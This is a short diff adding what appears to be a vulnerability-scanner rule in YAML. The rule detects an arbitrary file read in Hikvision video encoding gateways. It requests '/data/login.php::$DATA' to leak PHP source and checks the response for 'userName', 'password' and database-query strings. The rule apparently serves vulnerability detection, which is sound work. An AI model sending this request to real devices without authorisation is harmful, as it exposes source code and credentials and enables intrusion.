@@ -1,0 +1,14 @@
+name: HIKVISION-视频编码网关-DATA任意文件读取
+description: >
+  读取敏感文件
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/data/login.php::$DATA"
+    expression:
+      status: 200
+      body_all:
+        - "userName"
+        - "password"
+        - "DataBaseQuery"
